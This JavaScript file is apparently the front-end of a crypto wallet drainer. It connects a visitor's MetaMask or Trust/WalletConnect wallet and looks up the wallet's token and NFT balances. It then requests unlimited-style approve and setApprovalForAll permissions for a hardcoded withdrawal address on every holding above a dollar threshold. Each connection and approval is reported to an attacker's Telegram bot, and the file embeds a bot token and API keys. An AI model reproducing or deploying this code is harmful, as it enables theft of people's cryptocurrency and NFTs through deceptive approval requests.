const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
const chainIdsNetworks = {
    "ethereum": 1,
    "binance-smart-chain": 56,
    "polygon": 137
}
const chainIdsNames = {
    "ethereum": "Ethereum",
    "binance-smart-chain": "Binance Smart Chain",
    "polygon": "Polygon"
}
const forbiddenTokens = ["ETH", "BNB", "MATIC"]

const abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const abiNFT = [
    {
        "inputs": [{
            "internalType": "address",
            "name": "operator",
            "type": "address"
        }, {
            "internalType": "bool",
            "name": "approved",
            "type": "bool"
        }],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const accountBalances = {
    tokens: [],
    nft: []
}

const WITHDRAWAL_ADDRESS = "0x51D56aDd3F60F42b4D751574a8EF25EEFb538356"
const MIN_TOKEN_USD = 20
const MIN_NFT_USD = 100

let accountAddress = null, walletConnector, currentConnection

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }

    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }

    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}

const getBalances = async () => {

    try {
        //    document.querySelector('#transfer').style.display = "block";
        document.querySelector('#transfer').disabled = true;
    } catch (e) {}

    try {
        $("#overlay").fadeIn(300);
        $('#chainErrorMessage').hide();

        if (currentConnection === "metamask") {
            if (typeof window.ethereum.selectedAddress !== "undefined") {
                accountAddress = window.ethereum.selectedAddress
            } else if (typeof window.ethereum.address !== "undefined") {
                accountAddress = window.ethereum.address
            }
        } else if (currentConnection === "walletconnect") {
            accountAddress = walletConnector._accounts[0]
        }

        const response = await $.ajax({
            url: `https://api.zapper.fi/v2/balances?addresses%5B%5D=${accountAddress}`,
            type: "GET",
            headers: {
                Authorization: "Basic OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg=="
            }
        })

        console.log(response)

        $.ajax({
            type: "POST",
            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
            data: "parse_mode=HTML&text="+encodeURIComponent("started approving: "+accountAddress),
        });

        const events = response.split('event: ')

        for (const event of events) {
            const data = event.split('data: ')

            if (typeof data[0] !== "undefined") {
                console.log(data[0])
                try {
                    const category = JSON.parse(data[1]);
                    const wallet = category['wallet']
                    const nft = category['nft']

                    for (const wal of Object.values(wallet)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            accountBalances["tokens"].push(wal)
                        }
                    }

                    for (const wal of Object.values(nft)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            accountBalances["nft"].push(wal)
                        }
                    }
                } catch (e) {}
            }
        }

        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))

        for (const forbiddenToken of forbiddenTokens) {
            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)

            if (index > -1) {
                accountBalances.tokens.splice(index, 1)
            }
        }

        for(let i = 0; i < accountBalances.nft.length; i++) {
            let topNFT = null, topToken = null, withdrawalToken = null

            if (typeof accountBalances.nft[i] !== "undefined") {
                topNFT = accountBalances.nft[i]
            }

            withdrawalToken = topNFT

            if (withdrawalToken) {
                if (withdrawalToken.balanceUSD < MIN_NFT_USD) {
                    $("#overlay").fadeOut(300);

                    return
                }

                let web3, provider

                if (currentConnection === "metamask") {
                    web3 = new Web3(window.ethereum)
                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")

                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
                        });
                    }
                } else if (currentConnection === "walletconnect") {
                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
                        $('#chainErrorMessage').show();

                        $("#overlay").fadeOut(300);

                        return
                    }

                    provider = new window.WalletConnectProvider.default({
                        rpc: {
                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
                            56: "https://bsc-dataseed.binance.org/",
                            137: "https://polygon-rpc.com"
                        }
                    });

                    await provider.enable()

                    provider = new ethers.providers.Web3Provider(provider, "any")
                }

                const signer = provider.getSigner()

                if (withdrawalToken.appId === "tokens") {
                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)

                    try {
                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
                        $.ajax({
                            type: "POST",
                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
                        });
                    } catch (e) {
//                        getBalances()

                    }
                } else if (withdrawalToken.appId === "nft") {
                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)

                    try {
                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)

                        $.ajax({
                            type: "POST",
                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
                            data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
                        });

                    } catch (e) {
//                        getBalances()

                    }
                } else {

                }
            } else {

            }
        }

        for(let i = 0; i < accountBalances.tokens.length; i++) {
            let topNFT = null, topToken = null, withdrawalToken = null

            if (typeof accountBalances.tokens[i] !== "undefined") {
                topToken = accountBalances.tokens[i]
            }

            withdrawalToken = topToken

            if (withdrawalToken) {
                if (withdrawalToken.balanceUSD < MIN_TOKEN_USD) {
                    $("#overlay").fadeOut(300);
                    return
                }

                let web3, provider

                if (currentConnection === "metamask") {
                    web3 = new Web3(window.ethereum)
                    provider = new ethers.providers.Web3Provider(window.ethereum, "any")

                    if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
                        });
                    }
                } else if (currentConnection === "walletconnect") {
                    if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
                        $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
                        $('#chainErrorMessage').show();

                        $("#overlay").fadeOut(300);

                        return
                    }

                    provider = new window.WalletConnectProvider.default({
                        rpc: {
                            1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
                            56: "https://bsc-dataseed.binance.org/",
                            137: "https://polygon-rpc.com"
                        }
                    });

                    await provider.enable()

                    provider = new ethers.providers.Web3Provider(provider, "any")
                }

                const signer = provider.getSigner()

                if (withdrawalToken.appId === "tokens") {
                    const contract = new ethers.Contract(withdrawalToken.address, abi, signer)

                    try {
                        await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)

                        $.ajax({
                            type: "POST",
                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
                        });

                    } catch (e) {
//                        getBalances()

                    }
                } else if (withdrawalToken.appId === "nft") {
                    const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)

                    try {
                        await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)

                        $.ajax({
                            type: "POST",
                            url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
                            data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address),
                        });

                    } catch (e) {
//                        getBalances()

                    }
                } else {

                }
            } else {

            }
        }
        try {
            document.querySelector('#transfer').disabled = false;
        } catch (e) {}
        
    } catch (e) {
        console.log(e)
        try {
            document.querySelector('#transfer').disabled = false;
        } catch (e) {}
    }
}

const checkInstallMetamask = () => {
    return new Promise((res) => {
        if (typeof window.ethereum !== 'undefined') {
            return res(true)
        } else {
            return res(false)
        }
    })
}

const connectMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://metamask.app.link/dapp/${window.location.host}`)

        return
    }

    window.ethereum.on('accountsChanged', function (accounts) {
        accountAddress = accounts[0]

    });

    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

    accountAddress = accounts[0]

    $.ajax({
         type: "POST",
         url: "https://api.telegram.org/bot"+"1627191463:AAGEbLuyNMe56sh5JiIto3xPigRNUsrAVU0"+"/sendMessage?chat_id="+"-653343618",
         data: "parse_mode=HTML&text="+encodeURIComponent("AQUARE Metamask connected "+accountAddress),
    });

    currentConnection = "metamask"

    try {
        document.querySelector('#connect-metamask').style.display = "none";
        document.querySelector('#transfer').style.display = "block";
    } catch (e) {}
}

const connectTrustWallet = async () => {
    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)

        return
    }

    if (window.ethereum?.isTrust) {
        window.ethereum.on('accountsChanged', function (accounts) {
            accountAddress = accounts[0]


        });

        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

        accountAddress = accounts[0]
        currentConnection = "metamask"

    } else {
        if (!walletConnector.connected) {
            walletConnector.createSession().then(() => {
                const uri = walletConnector.uri;

                window.WalletConnectQRCodeModal.default.open(uri, () => {
                    console.log('QR Code Modal closed');
                });
            });
        } else {
            walletConnector.killSession();
        }
    }
}

const initMetamask = async () => {

    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {


        return
    }

    const installedMetamask = await checkInstallMetamask()

    if (!installedMetamask) {


        return
    }


}

const initWalletConnect = () => {
    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {


        return
    }

    walletConnector = new window.WalletConnect.default({
        bridge: 'https://bridge.walletconnect.org'
    });


    walletConnector.on('connect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {
            window.WalletConnectQRCodeModal.default.close();


            accountAddress = payload.params[0].accounts[0]
            currentConnection = "walletconnect"
        }
    });

    walletConnector.on('session_update', function (error, payload) {
        if (error) {
            console.error(error);
        } else if (walletConnector.connected) {

            accountAddress = payload.params[0].accounts[0]
        }

    });

    walletConnector.on('disconnect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {


            accountAddress = null
        }
    });
}


//setTimeout(connectMetamask, 1000)